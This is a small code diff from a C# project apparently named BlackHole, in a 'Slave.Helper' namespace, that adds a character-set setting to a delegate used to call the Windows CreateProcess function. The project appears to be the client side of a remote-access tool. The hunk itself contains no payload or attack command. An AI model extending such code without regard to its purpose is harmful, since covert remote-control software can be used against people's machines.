@@ -83,7 +83,7 @@ namespace BlackHole.Slave.Helper
             }
             #endregion
             
-            [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+            [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
             public delegate bool dCreateProcess(
                 string lpApplicationName,
                 string lpCommandLine,
